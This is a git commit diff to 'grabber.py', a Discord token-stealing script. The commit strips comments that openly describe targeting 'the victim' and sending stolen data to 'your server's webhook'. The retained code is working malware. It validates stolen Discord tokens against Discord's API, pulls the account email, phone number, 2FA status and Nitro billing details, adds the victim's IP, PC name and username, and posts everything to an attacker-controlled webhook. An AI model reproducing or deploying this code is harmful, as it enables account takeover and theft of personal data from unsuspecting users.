74daaac308cc0b41747e72ca9e018008be7dcd23
x9o <95175948+x9o@users.noreply.github.com>
2023-10-29 22:19:57 +0800

    Update grabber.py

--- grabber.py
+++ grabber.py
@@ -89,7 +89,7 @@ def get_token():
                     already_check.append(value)
                     headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                     try:
-                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers) # connecting discord api in order to send the embed
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers) 
                     except: continue
                     if res.status_code == 200:
                         res_json = res.json()
@@ -102,14 +102,14 @@ def get_token():
                         phone = res_json['phone']
                         mfa_enabled = res_json['mfa_enabled']
                         has_nitro = False
-                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers) # get the victim's nitro status from discord api
+                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers) 
                         nitro_data = res.json()
                         has_nitro = bool(len(nitro_data) > 0)
                         days_left = 0
-                        if has_nitro: #getting os and details for the embed that will be sent after the victim opens the file
+                        if has_nitro: 
                             d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                             d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            days_left = abs((d2 - d1).days) # the part which makes the message send in your server's webhook
+                            days_left = abs((d2 - d1).days) 
                         embed = f"""**{user_name}** *({user_id})*\n 
 > :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
 > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('thewebhook', data=payload.encode(), headers=headers2) # place your webhook here and when the victim opens the file his token and details will be sent to your server
+                            req = Request('thewebhook', data=payload.encode(), headers=headers2) 
                             urlopen(req)
                         except: continue
                 else: continue
